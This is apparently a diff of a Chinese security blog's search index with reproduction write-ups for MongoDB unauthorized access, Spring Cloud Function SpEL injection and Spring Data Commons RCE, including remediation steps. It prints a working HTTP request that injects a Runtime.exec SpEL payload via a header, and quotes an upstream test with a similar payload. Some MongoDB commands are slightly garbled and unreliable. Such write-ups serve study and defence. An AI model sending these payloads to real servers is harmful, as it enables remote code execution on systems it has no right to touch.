+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下载MongoDB</p>
+<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>
+
+
+
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>
+
+<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建数据库目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建数据库存放目录和日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令行中启动MongoDB服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Mongodb启动成功</p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>
+
+
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>
+
+
+
+<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>
+
+
+
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
+<p>① MongoDB 启动时添加 -auth 参数。</p>
+<p>② 给 MongoDB 添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(2) 禁用 HTTP 和 REST 端口</p>
+<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>
+
+
+
+<p>(3) 限制绑定 IP</p>
+<p>启动时加入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>未授权访问</category>
+      </categories>
+      <tags>
+        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -2400,6 +2704,52 @@
       <tags>
         <tag>-Web漏洞 -Spring框架 -远程代码执行</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2022/03/31/Spring-Cloud-Function%20SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="Spring-Cloud-Function-SpEl注入漏洞复现分析"><a href="#Spring-Cloud-Function-SpEl注入漏洞复现分析" class="headerlink" title="Spring-Cloud-Function SpEl注入漏洞复现分析"></a>Spring-Cloud-Function SpEl注入漏洞复现分析</h1><p>在Spring框架的JDK9版本(及以上版本)中，该漏洞是由于Spring Cloud Function中RoutingFunction类的 apply方法将请求头中spring.cloud.function.routing-expression传入的参数值作为SPEL表 达式进行处理，攻击者可以通过构造恶意的语句来实现SPEL表达式注入</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>3.0.0RELEASE&lt;&#x3D; Spring Cloud Function &lt;&#x3D;3.2.2</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Pizz33/Spring-Cloud-Function-SpEL</span><br></pre></td></tr></table></figure>
+
+<p>使用idea新增spring intializr项目，并且选择与之相匹配的java版本</p>
+<p>![image-20220401134932692](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401134932692.png)</p>
+<p>添加spring web和function</p>
+<p>![image-20220401135057462](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401135057462.png)</p>
+<p>![image-20220401135111832](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401135111832.png)</p>
+<p>新建项目后右侧选择maven选择maven-package编译jar包</p>
+<p>![image-20220401135632429](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401135632429.png)</p>
+<p>打包成功</p>
+<p>![image-20220401135708884](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401135708884.png)</p>
+<p>运行打包好的jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar demo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
+
+<p>![image-20220401135908045](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401135908045.png)</p>
+<p>浏览器访问8080端口，环境搭建成功</p>
+<p>![image-20220401103338817](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401103338817.png)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h3><p><strong>poc</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+<p><strong>计算器执行成功</strong></p>
+<p>![image-20220401113948882](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401113948882.png)</p>
+<p><strong>反弹shell</strong></p>
+<p>![image-20220401141823947](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401141823947.png)</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在<a href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">git提交描述</a>中，明确指出修复了<code>RoutingFunction</code> SpEL代码注入漏洞，并且可以看到目前只更新了两个文件，其中一个文件仅为单元测试.</p>
+<p>测试用例代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Copyright 2019-2019 the original author or authors.</span><br><span class="line"> *</span><br><span class="line"> * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"> * you may not use this file except in compliance with the License.</span><br><span class="line"> * You may obtain a copy of the License at</span><br><span class="line"> *</span><br><span class="line"> *      https://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"> *</span><br><span class="line"> * Unless required by applicable law or agreed to in writing, software</span><br><span class="line"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"> * See the License for the specific language governing permissions and</span><br><span class="line"> * limitations under the License.</span><br><span class="line"> */</span><br><span class="line">package org.springframework.cloud.function.context.config;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import org.junit.jupiter.api.AfterEach;</span><br><span class="line">import org.junit.jupiter.api.Assertions;</span><br><span class="line">import org.junit.jupiter.api.Test;</span><br><span class="line">import reactor.core.publisher.Flux;</span><br><span class="line">import reactor.test.StepVerifier;</span><br><span class="line">import org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line">import org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line">import org.springframework.cloud.function.context.FunctionCatalog;</span><br><span class="line">import org.springframework.cloud.function.context.FunctionProperties;</span><br><span class="line">import org.springframework.context.ConfigurableApplicationContext;</span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line">import org.springframework.messaging.Message;</span><br><span class="line">import org.springframework.messaging.support.MessageBuilder;</span><br><span class="line"></span><br><span class="line">import static org.assertj.core.api.Assertions.assertThat;</span><br><span class="line">import static org.junit.Assert.fail;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @author Oleg Zhurakousky</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">public class RoutingFunctionTests &#123;</span><br><span class="line">	private ConfigurableApplicationContext context;</span><br><span class="line">	@AfterEach</span><br><span class="line">	public void before() &#123;</span><br><span class="line">		System.clearProperty(&quot;spring.cloud.function.definition&quot;);</span><br><span class="line">		System.clearProperty(&quot;spring.cloud.function.routing-expression&quot;);</span><br><span class="line">		context.close();</span><br><span class="line">	&#125;</span><br><span class="line">	private FunctionCatalog configureCatalog() &#123;</span><br><span class="line">		context = new SpringApplicationBuilder(RoutingFunctionConfiguration.class).run(</span><br><span class="line">				&quot;--logging.level.org.springframework.cloud.function=DEBUG&quot;,</span><br><span class="line">				&quot;--spring.cloud.function.routing.enabled=true&quot;);</span><br><span class="line">		return context.getBean(FunctionCatalog.class);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;reverse&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testRoutingSimpleInputWithReactiveFunctionWithMessageHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;echoFlux&quot;).build();</span><br><span class="line">		assertThat(((Flux) function.apply(message)).blockFirst()).isEqualTo(&quot;hello&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testRoutingReactiveInputWithReactiveFunctionAndDefinitionMessageHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;echoFlux&quot;).build();</span><br><span class="line">		Flux resultFlux = (Flux) function.apply(Flux.just(message));</span><br><span class="line"></span><br><span class="line">		StepVerifier</span><br><span class="line">		.create(resultFlux)</span><br><span class="line">		.expectError()</span><br><span class="line">		.verify();</span><br><span class="line">		StepVerifier.create(resultFlux).expectError().verify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testRoutingReactiveInputWithReactiveFunctionAndExpressionMessageHeader() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;&#x27;echoFlux&#x27;&quot;).build();</span><br><span class="line">		Flux resultFlux = (Flux) function.apply(Flux.just(message));</span><br><span class="line">		StepVerifier</span><br><span class="line">		.create(resultFlux)</span><br><span class="line">		.expectError()</span><br><span class="line">		.verify();</span><br><span class="line">		StepVerifier.create(resultFlux).expectError().verify();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void failWithHeaderProvidedExpressionAccessingRuntime() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.routing-expression&quot;,</span><br><span class="line">						&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a calculator.app\&quot;)&quot;)</span><br><span class="line">				.build();</span><br><span class="line">		try &#123;</span><br><span class="line">			function.apply(message);</span><br><span class="line">			fail();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception e) &#123;</span><br><span class="line">			assertThat(e.getMessage()).isEqualTo(&quot;EL1005E: Type cannot be found &#x27;java.lang.Runtime&#x27;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndDefinitionProperty() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;reverse&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndRoutingExpression() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;headers.function_name&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).setHeader(&quot;function_name&quot;, &quot;reverse&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;unchecked&quot;, &quot;rawtypes&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageAndRoutingExpressionCaseInsensitive() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;headers.function_Name&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).setHeader(&quot;function_name&quot;, &quot;reverse&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;headers.FunCtion_namE&quot;);</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;olleh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithRoutingBeanExpression() &#123;</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;, &quot;@reverse.apply(#root.getHeaders().get(&#x27;func&#x27;))&quot;);</span><br><span class="line">		System.setProperty(FunctionProperties.PREFIX + &quot;.routing-expression&quot;,</span><br><span class="line">				&quot;@reverse.apply(#root.getHeaders().get(&#x27;func&#x27;))&quot;);</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;).setHeader(&quot;func&quot;, &quot;esacreppu&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;HELLO&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testOtherExpectedFailures() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME);</span><br><span class="line">		// no function.definition header or function property</span><br><span class="line">		try &#123;</span><br><span class="line">			function.apply(MessageBuilder.withPayload(&quot;hello&quot;).build());</span><br><span class="line">			Assertions.fail();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception e) &#123;</span><br><span class="line">			//ignore</span><br><span class="line">			// ignore</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// non existing function</span><br><span class="line">		try &#123;</span><br><span class="line">			function.apply(MessageBuilder.withPayload(&quot;hello&quot;).setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;blah&quot;).build());</span><br><span class="line">			function.apply(MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">					.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;blah&quot;).build());</span><br><span class="line">			Assertions.fail();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception e) &#123;</span><br><span class="line">			//ignore</span><br><span class="line">			// ignore</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">	@Test</span><br><span class="line">	public void testInvocationWithMessageComposed() &#123;</span><br><span class="line">		FunctionCatalog functionCatalog = this.configureCatalog();</span><br><span class="line">		Function function = functionCatalog.lookup(RoutingFunction.FUNCTION_NAME + &quot;|reverse&quot;);</span><br><span class="line">		assertThat(function).isNotNull();</span><br><span class="line">		Message&lt;String&gt; message = MessageBuilder.withPayload(&quot;hello&quot;)</span><br><span class="line">				.setHeader(FunctionProperties.PREFIX + &quot;.definition&quot;, &quot;uppercase&quot;).build();</span><br><span class="line">		assertThat(function.apply(message)).isEqualTo(&quot;OLLEH&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	@EnableAutoConfiguration</span><br><span class="line">	@Configuration</span><br><span class="line">	protected static class RoutingFunctionConfiguration &#123;</span><br><span class="line">		@Bean</span><br><span class="line">		public Function&lt;String, String&gt; reverse() &#123;</span><br><span class="line">			return v -&gt; new StringBuilder(v).reverse().toString();</span><br><span class="line">		&#125;</span><br><span class="line">		@Bean</span><br><span class="line">		public Function&lt;String, String&gt; uppercase() &#123;</span><br><span class="line">			return String::toUpperCase;</span><br><span class="line">		&#125;</span><br><span class="line">		@Bean</span><br><span class="line">		public Function&lt;Flux&lt;String&gt;, Flux&lt;String&gt;&gt; echoFlux() &#123;</span><br><span class="line">			return f -&gt; f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>位于 RoutingFunctionTests.java 的128行，可以清楚地看出Http头部构造方式,在给<code>Spring Cloud Function</code>的web服务发送包的时候，加一个相关的Header信息，然后跟入SpEL表达式即可执行命令。</p>
+<p>![image-20220401151108010](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401151108010.png)</p>
+<p>在官方最新的修补文件中，可以看到新增了<code>headerEvalContext</code>对象，该对象所对应的是使用了仅支持最基本功能的<code>SimpleEvaluationContext</code>。且在调用<code>functionFromExpression</code>方法的时候新增了一个<code>isViaHead</code>布尔类型的参数，用来判断该值是否是取自消息的<code>header</code>中，如果是则使用<code>headerEvalContext</code>对象来解析SpEL表达式。</p>
+<p>![image-20220401151238119](Spring-Cloud-Function SpEl注入漏洞复现分析&#x2F;image-20220401151238119.png)</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.xttblog.com/?p=5329">Spring框架被爆RCE 0day高危漏洞！附修复教程！ – 业余草 (xttblog.com)</a></p>
+<p><a href="https://blog.csdn.net/qq_44122254/article/details/123815641">(67条消息) Spring-Cloud-Function SpEL RCE(VULFOCUS靶场)_坚果雨的博客-CSDN博客</a></p>
+<p>[<a href="https://forum.ywhack.com/shell.php">~]#棱角 ::Edge.Forum* (ywhack.com)</a></p>
+<p>[漏洞复现-Spring Cloud Function SpEL表达式注入 | Hyyrent blog (pizz33.github.io)](<a href="https://pizz33.github.io/2022/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Spring">https://pizz33.github.io/2022/03/27/漏洞复现-Spring</a> Cloud Function SpEL表达式注入&#x2F;)</p>
+<p><a href="https://www.anquanke.com/post/id/271167">SpringCloud Function SpEL漏洞环境搭建+漏洞复现 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+]]></content>
   </entry>
   <entry>
     <title>ThinkcmfSQL注入漏洞复现</title>
@@ -3481,6 +3831,72 @@
       </tags>
   </entry>
   <entry>
+    <title></title>
+    <url>/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring%20Data%20Commons%20RCE/</url>
+    <content><![CDATA[<h1 id="代码审计之Spring-Data-Commons-RCE"><a href="#代码审计之Spring-Data-Commons-RCE" class="headerlink" title="代码审计之Spring Data Commons RCE"></a>代码审计之Spring Data Commons RCE</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。此漏洞产生于Spring Data Commons组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。</p>
+<p>该漏洞的成因是当用户在项目中利用了Sprng-Data的相关Web特性对输入参数进行自动匹配时会将用户提交的form表单和key值作为SpEL的执行内容，导致SpEL表达式注入漏洞。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过Git命令获取源码 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/spring-projects/spring-data-examples/</span><br></pre></td></tr></table></figure>
+
+<p>这里由于在2.0.5版本中拒绝使用了SpEl表达式，所以需要回退到一个较早且存在漏洞的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard ec94079b8f2b1e66414f410d89003bd333fb6e7d</span><br></pre></td></tr></table></figure>
+
+<p>![image-20220406115416611](代码审计之Spring Data Commons RCE&#x2F;image-20220406115416611.png)</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Spring MVC框架会处理来自前端的页面的请求，并根据请求进行数据的封装，处理前端页面的请求暂不赘述，我们现在主要探讨对数据的封装处理，因为Spring Data Commons框架在做数据封装处理的时候产生了漏洞。</p>
+<p>由提交对比Commit信息，考研发现漏洞文件应为MapDataBinder.java中的setPropertyVlue方法，如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException &#123;</span><br><span class="line">            if (!this.isWritableProperty(propertyName)) &#123;</span><br><span class="line">                throw new NotWritablePropertyException(this.type, propertyName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">                context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));</span><br><span class="line">                context.setTypeConverter(new StandardTypeConverter(this.conversionService));</span><br><span class="line">                context.setRootObject(this.map);</span><br><span class="line">                Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">                PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">                TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">                TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line">                propertyType = propertyName.endsWith(&quot;]&quot;) ? propertyType.getActualType() : propertyType;</span><br><span class="line">                if (propertyType != null &amp;&amp; this.conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">                    if (descriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t find PropertyDescriptor for %s on %s!&quot;, leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);</span><br><span class="line">                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);</span><br><span class="line">                    if (typeDescriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t obtain type descriptor for method parameter %s!&quot;, methodParameter));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression.setValue(context, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>该方法首先通过isWritableProperty()函数校验propertyName参数 是否为Controller设置的Form映射对象中的成员变量。</p>
+<p>![image-20220406135207008](代码审计之Spring Data Commons RCE&#x2F;image-20220406135207008.png)</p>
+<p>![image-20220406135232464](代码审计之Spring Data Commons RCE&#x2F;image-20220406135232464.png)</p>
+<p>然后再实例化StandardEvaluationContext类</p>
+<p>![image-20220406135348825](代码审计之Spring Data Commons RCE&#x2F;image-20220406135348825.png)</p>
+<p>并通过调用PARSER.parseExpression()来设置需要解析的表达式</p>
+<p>![image-20220406135532192](代码审计之Spring Data Commons RCE&#x2F;image-20220406135532192.png)</p>
